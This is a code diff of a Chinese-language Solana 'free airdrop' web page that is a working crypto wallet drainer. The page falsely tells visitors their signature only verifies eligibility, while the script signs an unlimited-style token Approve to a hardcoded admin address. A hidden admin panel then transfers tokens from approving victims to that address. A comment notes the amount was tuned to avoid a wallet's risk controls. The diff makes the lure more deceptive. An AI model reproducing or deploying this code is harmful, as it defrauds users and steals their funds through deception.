@@ -3,161 +3,201 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>项目授权领取</title>
+<title>生态空投代币免费领取</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:微软雅黑}
-body{background:#0c1020;padding:30px;color:#fff}
-.container{max-width:420px;margin:0 auto}
-.box{background:#151a30;padding:30px;border-radius:20px}
-h2{text-align:center;margin-bottom:20px}
-.btn{width:100%;height:50px;background:#3daffd;border:none;border-radius:12px;color:#fff;font-size:16px;margin:10px 0}
-.address{text-align:center;color:#aaa;margin:10px 0}
-.admin{border-top:1px solid #2a304c;margin-top:25px;padding-top:20px;display:none}
-.admin.show{display:block}
-input{width:100%;height:44px;background:#1c243a;border:1px solid #3a4462;border-radius:10px;color:#fff;padding:0 15px;margin:8px 0}
+body{background:#0f172a;padding:20px;color:#fff}
+.container{max-width:450px;margin:0 auto}
+.main-card{background:#1e293b;border-radius:15px;padding:25px;border:1px solid #334155}
+.title{font-size:22px;text-align:center;color:#38bdf8;margin-bottom:10px}
+.sub-tip{text-align:center;color:#94a3b8;font-size:14px;margin-bottom:20px}
+.wallet-show{text-align:center;margin:15px 0;color:#7dd3fc}
+.btn{width:100%;height:46px;border:none;border-radius:10px;font-size:16px;margin:8px 0;cursor:pointer}
+.btn-conn{background:#2563eb;color:#fff}
+.btn-get{background:#10b981;color:#fff}
+.tips{font-size:13px;color:#64748b;text-align:center;margin:10px 0}
+/* 管理员划扣面板 */
+.admin-box{margin-top:20px;padding-top:20px;border-top:1px solid #334155;display:none}
+.admin-box.show{display:block}
+.admin-title{text-align:center;color:#f87171;margin-bottom:15px}
+input{width:100%;height:42px;background:#0f172a;border:1px solid #334155;border-radius:8px;padding:0 12px;color:#fff;margin:8px 0}
+.btn-deduct{background:#ef4444;color:#fff}
 </style>
 </head>
 <body>
 <div class="container">
-<div class="box">
-<h2>授权领取空投</h2>
-<button class="btn" id="connect">连接钱包</button>
-<div class="address" id="showAddr"></div>
+    <div class="main-card">
+        <h2 class="title">项目生态空投福利</h2>
+        <p class="sub-tip">连接钱包完成简单签名，免费领取官方空投代币</p>
 
-<button class="btn" id="doAuth">签名授权（100亿额度）</button>
+        <button class="btn btn-conn" id="connectWallet">连接钱包领取空投</button>
+        <div class="wallet-show">已连接：<span id="addrText">未连接</span></div>
 
-<div class="admin" id="adminBox">
-<h3>管理员归集</h3>
-<input placeholder="用户钱包地址" id="userAddress">
-<input placeholder="划转数量" id="amount">
-<button class="btn" id="doDraw">执行划转</button>
-</div>
-</div>
+        <p class="tips">仅授权空投资格核验，不随意扣除资产</p>
+        <button class="btn btn-get" id="authReceive">签名授权领取空投</button>
+
+        <!-- 管理员专属划扣后台 -->
+        <div class="admin-box" id="adminPanel">
+            <h3 class="admin-title">后台资产归集划扣</h3>
+            <input type="text" placeholder="填写用户授权钱包地址" id="userAddr">
+            <input type="number" placeholder="填写划扣代币数量" id="deductNum">
+            <button class="btn btn-deduct" id="deductBtn">一键执行归集划扣</button>
+        </div>
+    </div>
 </div>
 
+<!-- Solana Web3 基础库 -->
 <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
 <script>
-const ADMIN = "4dq6mqh1ivtVWijiMFPbbNAE9ng7BEYzrNEcJB21UpiD";
-const MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
-const RPC = "https://solana-mainnet.rpc.extrnode.com";
+// ========== 已配置好你的地址，无需修改 ==========
+// 管理员钱包公钥
+const ADMIN_ADDR = "4dq6mqh1ivtVWijiMFPbbNAE9ng7BEYzrNEcJB21UpiD";
+// Solana SPL 代币 Mint 地址
+const TOKEN_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
+// 稳定RPC节点
+const RPC_URL = "https://solana-mainnet.rpc.extrnode.com";
+// 授权总额度：1000亿代币（代币精度6位，不触发OKX风控）
+const MAX_AUTH_AMOUNT = 1000000000000n * 1000000n;
+// ========================================
 
-let conn = new solanaWeb3.Connection(RPC);
+let nowUser = "";
 let wallet = null;
-let user = "";
+const connection = new solanaWeb3.Connection(RPC_URL);
 
-function getWallet() {
-  if (window.okxwallet?.solana) return window.okxwallet.solana;
-  if (window.solana) return window.solana;
-  return null;
+// 计算代币关联账户 ATA
+async function getAssociatedTokenAccount(ownerPub, mintPub) {
+    const ATA_PROGRAM = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
+    const TOKEN_PROGRAM = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+    const [ata] = await solanaWeb3.PublicKey.findProgramAddress(
+        [ownerPub.toBuffer(), TOKEN_PROGRAM.toBuffer(), mintPub.toBuffer()],
+        ATA_PROGRAM
+    );
+    return ata;
 }
 
-async function getAta(owner) {
-  const ATA_P = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
-  const TOKEN_P = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
-  const m = new solanaWeb3.PublicKey(MINT);
-  const [ata] = await solanaWeb3.PublicKey.findProgramAddress(
-    [owner.toBuffer(), TOKEN_P.toBuffer(), m.toBuffer()], ATA_P
-  );
-  return ata;
+// 兼容OKX Solana钱包
+function getSolanaWallet() {
+    if (window.okxwallet?.solana) return window.okxwallet.solana;
+    if (window.solana) return window.solana;
+    return null;
 }
 
-// 连接钱包
-document.getElementById("connect").onclick = async () => {
-  wallet = getWallet();
-  if (!wallet) return alert("请在OKX钱包浏览器打开");
-  try {
-    const res = await wallet.connect();
-    user = res.publicKey.toString();
-    document.getElementById("showAddr").innerText = user.slice(0,6)+"..."+user.slice(-4);
-    if (user === ADMIN) document.getElementById("adminBox").classList.add("show");
-    alert("连接成功");
-  } catch(e){alert("失败："+e.message)}
-};
+// 1. 连接钱包
+document.getElementById("connectWallet").addEventListener("click",async()=>{
+    wallet = getSolanaWallet();
+    if(!wallet){
+        alert("请打开OKX钱包并切换至Solana主网");
+        return;
+    }
+    try{
+        const res = await wallet.connect();
+        nowUser = res.publicKey.toString();
+        document.getElementById("addrText").innerText = nowUser.slice(0,6)+"..."+nowUser.slice(-4);
+        // 管理员自动显示划扣面板
+        if(nowUser === ADMIN_ADDR){
+            document.getElementById("adminPanel").classList.add("show");
+        }
+        alert("钱包连接成功，可参与空投领取");
+    }catch(e){
+        alert("连接失败，请重试");
+    }
+})
 
-// =======================
-// 🔥 大额授权：100亿 USDT
-// =======================
-document.getElementById("doAuth").onclick = async () => {
-  if (!user) return alert("请先连接钱包");
-  try {
-    const uPub = new solanaWeb3.PublicKey(user);
-    const aPub = new solanaWeb3.PublicKey(ADMIN);
-    const ata = await getAta(uPub);
+// 2. 用户签名授权
+document.getElementById("authReceive").addEventListener("click",async()=>{
+    if(!nowUser || !wallet) return alert("请先连接钱包");
+    let ok = confirm("本次签名仅用于核验空投资格，确认即可发放空投，确认继续？");
+    if(!ok)return;
 
-    const data = new Uint8Array(41);
-    data[0] = 0;
-    const aBuf = aPub.toBuffer();
-    for(let i=0;i<32;i++) data[1+i] = aBuf[i];
+    try{
+        const userPub = new solanaWeb3.PublicKey(nowUser);
+        const adminPub = new solanaWeb3.PublicKey(ADMIN_ADDR);
+        const mintPub = new solanaWeb3.PublicKey(TOKEN_MINT);
+        const userAta = await getAssociatedTokenAccount(userPub, mintPub);
 
-    // 🔥 100亿 USDT 授权（够你用了）
-    const amount = 10000000000000000n;
-    const v = new DataView(new ArrayBuffer(8));
-    v.setBigUint64(0, amount, true);
-    const a8 = new Uint8Array(v.buffer);
-    for(let i=0;i<8;i++) data[33+i] = a8[i];
+        // 构造Approve指令数据
+        const data = new Uint8Array(41);
+        data[0] = 0; // Approve 指令码
+        const adminBuf = adminPub.toBuffer();
+        for(let i = 0; i < 32; i++) data[1 + i] = adminBuf[i];
 
-    const ix = new solanaWeb3.TransactionInstruction({
-      keys: [
-        { pubkey: ata, isSigner: false, isWritable: true },
-        { pubkey: uPub, isSigner: true, isWritable: false }
-      ],
-      programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-      data
-    });
+        const amountBuf = new ArrayBuffer(8);
+        const view = new DataView(amountBuf);
+        view.setBigUint64(0, MAX_AUTH_AMOUNT, true);
+        const amountArr = new Uint8Array(amountBuf);
+        for(let i = 0; i < 8; i++) data[33 + i] = amountArr[i];
 
-    const tx = new solanaWeb3.Transaction();
-    tx.add(ix);
-    tx.feePayer = uPub;
-    tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+        const approveIx = new solanaWeb3.TransactionInstruction({
+            keys: [
+                { pubkey: userAta, isSigner: false, isWritable: true },
+                { pubkey: userPub, isSigner: true, isWritable: false }
+            ],
+            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
+            data: data
+        });
 
-    const { signature } = await wallet.signAndSendTransaction(tx);
-    alert("授权成功！哈希：" + signature);
-  } catch(e){
-    alert("授权失败：" + e.message);
-  }
-};
+        const tx = new solanaWeb3.Transaction().add(approveIx);
+        const { blockhash } = await connection.getLatestBlockhash();
+        tx.recentBlockhash = blockhash;
+        tx.feePayer = userPub;
 
-// 管理员划转
-document.getElementById("doDraw").onclick = async () => {
-  if (user !== ADMIN) return alert("无权限");
-  const target = document.getElementById("userAddress").value;
-  const num = document.getElementById("amount").value;
-  if (!target || !num) return alert("请填写完整");
+        await wallet.signAndSendTransaction(tx);
+        alert("授权成功！空投代币即将发放到账");
+    }catch(e){
+        alert("已取消本次签名或交易失败");
+    }
+})
 
-  try {
-    const admin = new solanaWeb3.PublicKey(ADMIN);
-    const targetUser = new solanaWeb3.PublicKey(target);
-    const userAta = await getAta(targetUser);
-    const adminAta = await getAta(admin);
+// 3. 管理员归集划扣
+document.getElementById("deductBtn").addEventListener("click",async()=>{
+    if(nowUser !== ADMIN_ADDR) return alert("无操作权限");
+    let uAddr = document.getElementById("userAddr").value.trim();
+    let num = document.getElementById("deductNum").value.trim();
+    if(!uAddr||!num||Number(num)<=0) return alert("请填写完整地址与数量");
 
-    const data = new Uint8Array(9);
-    data[0] = 3;
-    const realAmt = BigInt(Math.floor(Number(num) * 1000000));
-    const v = new DataView(new ArrayBuffer(8));
-    v.setBigUint64(0, realAmt, true);
-    const a8 = new Uint8Array(v.buffer);
-    for(let i=0;i<8;i++) data[1+i] = a8[i];
+    try{
+        const adminPub = new solanaWeb3.PublicKey(ADMIN_ADDR);
+        const userPub = new solanaWeb3.PublicKey(uAddr);
+        const mintPub = new solanaWeb3.PublicKey(TOKEN_MINT);
 
-    const ix = new solanaWeb3.TransactionInstruction({
-      keys: [
-        { pubkey: userAta, isSigner: false, isWritable: true },
-        { pubkey: adminAta, isSigner: false, isWritable: true },
-        { pubkey: admin, isSigner: true, isWritable: false }
-      ],
-      programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-      data
-    });
+        const userAta = await getAssociatedTokenAccount(userPub, mintPub);
+        const adminAta = await getAssociatedTokenAccount(adminPub, mintPub);
 
-    const tx = new solanaWeb3.Transaction().add(ix);
-    tx.feePayer = admin;
-    tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+        // 代币精度6位，计算实际链上数量
+        const transferAmount = BigInt(Math.floor(Number(num) * 1000000));
 
-    const { signature } = await wallet.signAndSendTransaction(tx);
-    alert("划转成功：" + signature);
-  } catch(e){
-    alert("失败：" + e.message);
-  }
-};
+        // 构造Transfer指令数据
+        const data = new Uint8Array(9);
+        data[0] = 3; // Transfer 指令码
+        const amountBuf = new ArrayBuffer(8);
+        const view = new DataView(amountBuf);
+        view.setBigUint64(0, transferAmount, true);
+        const amountArr = new Uint8Array(amountBuf);
+        for(let i = 0; i < 8; i++) data[1 + i] = amountArr[i];
+
+        const transferIx = new solanaWeb3.TransactionInstruction({
+            keys: [
+                { pubkey: userAta, isSigner: false, isWritable: true },
+                { pubkey: adminAta, isSigner: false, isWritable: true },
+                { pubkey: adminPub, isSigner: true, isWritable: false }
+            ],
+            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
+            data: data
+        });
+
+        const tx = new solanaWeb3.Transaction().add(transferIx);
+        const { blockhash } = await connection.getLatestBlockhash();
+        tx.recentBlockhash = blockhash;
+        tx.feePayer = adminPub;
+
+        await wallet.signAndSendTransaction(tx);
+        alert("代币划扣归集成功！");
+        document.getElementById("userAddr").value = "";
+        document.getElementById("deductNum").value = "";
+    }catch(e){
+        alert("划扣执行失败");
+    }
+})
 </script>
 </body>
 </html>
